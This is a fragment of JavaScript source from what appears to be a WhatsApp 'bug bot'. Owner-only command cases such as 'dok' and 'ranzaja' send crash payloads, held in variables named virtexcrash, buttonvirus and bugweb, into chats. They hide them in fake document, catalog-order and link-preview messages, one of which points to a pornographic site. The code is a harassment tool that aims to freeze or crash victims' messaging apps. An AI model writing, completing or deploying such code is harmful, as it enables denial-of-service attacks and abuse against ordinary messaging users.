...
if (!isCreator) throw mess.owner
kontolu = '``🔥 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥``',
ranz.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${bugweb}`,body: '🔥 𝐁𝐔𝐆 - 𝐓𝐁𝐂 - 𝐖𝐀 🔥',previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com`}}})
break
case 'dok':
if (!isCreator) throw mess.owner
y1 = fs.readFileSync('./pirtex/iphone.mp3')
ranz.sendMessage(m.chat, {document: y1, fileName: `🔥 𝐁𝐔𝐆 - 𝐁𝐎𝐓 🔥 .${buttonvirus}.mp3`, quoted: m})
break
case 'ranzaja' : {
if (!isCreator) throw mess.owner
connecting = ranz
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© ISAL MODS WA${philips}`,
"jpegThumbnail":virgamny,
"orderTitle": `© ISAL MODS WA${philips}`,
...
ranz.sendMessage(m.chat, { text: `${text} ${virtexcrash}`, contextInfo:{"externalAdReply": {"title": ` ${virtexcrash}`,"body": `${virtexcrash}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": ``,"sourceUrl": "https://wa.me/stickerpack/StickerHeist"}}}, { quoted: m})
break
case 'poll': {
if (!isCreator) return
